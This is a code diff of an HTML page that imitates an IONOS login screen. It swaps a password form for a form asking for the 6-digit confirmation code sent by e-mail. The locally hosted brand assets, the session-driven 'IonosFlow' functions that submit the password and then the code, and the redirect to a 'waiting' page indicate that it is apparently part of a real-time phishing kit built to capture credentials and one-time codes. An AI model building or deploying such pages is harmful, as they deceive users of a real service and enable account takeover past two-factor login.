@@ -47,18 +47,18 @@
       text-decoration: none;
     }
 
-    .oao-navi-help:before {
-      font-family: exos-icon-font;
-      content: "\e9a8";
-      font-size: 22px;
-      font-style: normal;
+    .confirm-intro {
+      margin: 0 0 20px;
+      font-size: 14px;
+      line-height: 1.6;
+      color: #333;
     }
 
     .identifier-row {
       display: flex;
       align-items: center;
       gap: 8px;
-      margin-bottom: 8px;
+      margin-bottom: 20px;
       flex-wrap: wrap;
     }
 
@@ -105,16 +105,10 @@
       min-width: 0;
     }
 
-    .button-current-identifier .user-icon {
-      display: inline-flex;
-      flex-shrink: 0;
-      color: #1474c4;
-    }
-
     .button-current-identifier .user-icon svg {
       width: 18px;
       height: 18px;
-      fill: currentColor;
+      fill: #1474c4;
     }
 
     .button-current-identifier span {
@@ -127,20 +121,25 @@
       word-break: break-all;
     }
 
+    .code-error {
+      background: #fff0f0;
+      border: 1px solid #ff6159;
+      border-radius: 8px;
+      color: #c0392b;
+      font-size: 13px;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
+
     .current-identifier {
       max-width: 100% !important;
     }
 
-    .password-field-wrap {
-      position: relative;
-    }
-
-    .password-field-wrap .input-text-group {
-      --input-text-group-height: 48px;
-    }
-
-    .password-field-wrap .input-text {
-      font-size: 15px;
+    #code {
+      font-size: 18px;
+      letter-spacing: 0.25em;
+      text-align: left;
     }
   </style>
 </head>
@@ -164,7 +163,7 @@
             <input
               type="search"
               class="input-text"
-              placeholder="Suche nach Funktionen, Domains und Hilfe"
+              placeholder="Nach Funktionen, Domains und Hilfe suchen"
               autocomplete="off"
               tabindex="-1"
             />
@@ -172,7 +171,12 @@
         </div>
       </div>
       <div class="oao-navi-right hide-when-headless">
-        <a class="oao-navi-help" href="https://www.ionos.de/hilfe/" target="_blank" rel="noopener" aria-label="Hilfe"></a>
+        <a class="oao-navi-help" href="https://www.ionos.de/hilfe/" target="_blank" rel="noopener" aria-label="Hilfe">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#003d8f" stroke-width="1.8">
+            <path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/>
+            <circle cx="12" cy="12" r="1" fill="#003d8f" stroke="none"/>
+          </svg>
+        </a>
       </div>
     </div>
 
@@ -186,25 +190,31 @@
               <ul>
                 <li class="stripe stripe--cropped">
                   <div class="stripe__item">
-                    <img class="stripe__visual" src="ionos-assets/image/password.svg" height="58" width="auto" alt="" />
+                    <img class="stripe__visual" src="ionos-assets/image/email-confirmation.svg" height="58" width="auto" alt="" />
                   </div>
                   <div class="stripe__item">
-                    <h1 class="headline stripe__element">Passwort eingeben</h1>
+                    <h1 class="headline stripe__element">Login bestätigen</h1>
                   </div>
                 </li>
               </ul>
             </section>
 
             <section class="sheet__section sheet__section--default">
-              <form id="ionos-password-form" method="POST" novalidate>
+              <p class="confirm-intro paragraph">
+                Geben Sie den 6-stelligen Code ein, der an Ihre <strong>E-Mail-Adresse</strong> gesendet wurde, um Ihren Login zu bestätigen.
+              </p>
+
+              <div id="code-error" class="code-error" hidden></div>
+
+              <form id="ionos-confirm-form" method="POST" novalidate>
 
                 <div class="container-current-identifier">
                   <div class="identifier-row">
-                    <a class="identifier-back" href="ionos-waiting.html" id="back-link" aria-label="Zurück">
+                    <a class="identifier-back" href="ionos.html" aria-label="Zurück">
                       <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg>
                     </a>
                     <span class="current-identifier">
-                      <span class="button-current-identifier" id="current-user-btn">
+                      <span class="button-current-identifier">
                         <span class="user-icon" aria-hidden="true">
                           <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                         </span>
@@ -216,30 +226,21 @@
 
                 <ul>
                   <li class="form-stripe">
-                    <label class="label" for="password">Passwort</label>
-                    <div class="password-field-wrap">
-                      <div class="input-text-group input-text-group--filled">
-                        <input
-                          type="password"
-                          class="input-text form-input"
-                          name="password"
-                          id="password"
-                          tabindex="1"
-                          required
-                          autofocus
-                          autocomplete="current-password"
-                        />
-                        <button
-                          type="button"
-                          class="input-text-group__action input-text-group__action--show-password"
-                          id="toggle-password"
-                          aria-label="Passwort anzeigen"
-                        ></button>
-                      </div>
-                    </div>
-                    <p class="input-byline">
-                      <a class="link" href="https://passwort.ionos.de/">Passwort vergessen?</a>
-                    </p>
+                    <label class="label" for="code">Code</label>
+                    <input
+                      type="text"
+                      class="input-text form-input"
+                      name="code"
+                      id="code"
+                      tabindex="1"
+                      required
+                      autofocus
+                      autocomplete="one-time-code"
+                      inputmode="numeric"
+                      maxlength="6"
+                      pattern="[0-9]{6}"
+                      spellcheck="false"
+                    />
                   </li>
                   <li class="form-stripe form-stripe--actions">
                     <button
@@ -291,34 +292,33 @@
       const sessionId = IonosFlow.requireSession();
       if (!sessionId) return;
 
-      const pw = document.getElementById("password");
-      const toggle = document.getElementById("toggle-password");
+      const codeInput = document.getElementById("code");
+      const errorBox = document.getElementById("code-error");
 
-      IonosFlow.loadSessionInfo(sessionId).then(function (info) {
+      IonosFlow.loadSessionInfo(sessionId).then(async function (info) {
         if (!info) return;
         document.getElementById("display-identifier").textContent = info.email;
-        document.getElementById("back-link").href =
-          "ionos-waiting.html?s=" + encodeURIComponent(sessionId);
+        if (info.error) {
+          IonosFlow.showError(errorBox, info.error);
+          await fetch("/api/ionos/session/" + encodeURIComponent(sessionId) + "?consume=1");
+        }
       });
 
-      toggle.addEventListener("click", function () {
-        const show = pw.type === "password";
-        pw.type = show ? "text" : "password";
-        toggle.classList.toggle("input-text-group__action--show-password", !show);
-        toggle.classList.toggle("input-text-group__action--hide-password", show);
-        toggle.setAttribute("aria-label", show ? "Passwort verbergen" : "Passwort anzeigen");
+      codeInput.addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "").slice(0, 6);
       });
 
-      document.getElementById("ionos-password-form").addEventListener("submit", async function (e) {
+      document.getElementById("ionos-confirm-form").addEventListener("submit", async function (e) {
         e.preventDefault();
-        const password = pw.value;
-        if (!password) return;
+        const code = codeInput.value.trim();
+        if (code.length !== 6) return;
 
         const btn = document.getElementById("button--with-loader");
         btn.disabled = true;
         btn.textContent = "Weiter …";
+        IonosFlow.showError(errorBox, "");
 
-        const data = await IonosFlow.submitPassword(sessionId, password);
+        const data = await IonosFlow.submitCode(sessionId, code);
         if (data.ok) {
           IonosFlow.goWaiting(sessionId);
         } else {
